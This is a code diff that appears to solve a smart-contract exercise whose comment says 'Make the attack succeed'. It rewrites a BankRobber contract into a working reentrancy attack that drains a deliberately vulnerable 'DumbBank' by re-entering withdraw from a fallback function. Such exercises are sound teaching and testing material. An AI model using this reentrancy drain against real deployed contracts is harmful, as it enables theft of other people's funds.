@@ -25,17 +25,30 @@ interface IDumbBank {
 
 // This attack fails. Make the attack succeed.
 contract BankRobber {
-    IDumbBank dumbBank;
+    DumbBank dumbBank;
 
-    constructor(IDumbBank _dumbBank) payable {
+    constructor(DumbBank _dumbBank) payable {
         dumbBank = _dumbBank;
-        _dumbBank.deposit{value: 1 ether}();
-        _dumbBank.withdraw(1 ether);
+        TrueBankRobber TrueBankrobber = new TrueBankRobber{value: msg.value}(_dumbBank);
+        TrueBankrobber.attack();
+    }
+}
+
+contract TrueBankRobber {
+    DumbBank dumbBank;
+    constructor(DumbBank _dumbBank) payable {
+        dumbBank = _dumbBank;
+    }
+    function attack() public payable {
+        dumbBank.deposit{value: 1 ether}();
+        dumbBank.withdraw(1 ether);
     }
 
     fallback() external payable {
-        if (address(dumbBank).balance > 1 ether) {
+        if (address(dumbBank).balance >= 1 ether) {
             dumbBank.withdraw(1 ether);
         }
     }
+
+    receive() external payable {}
 }
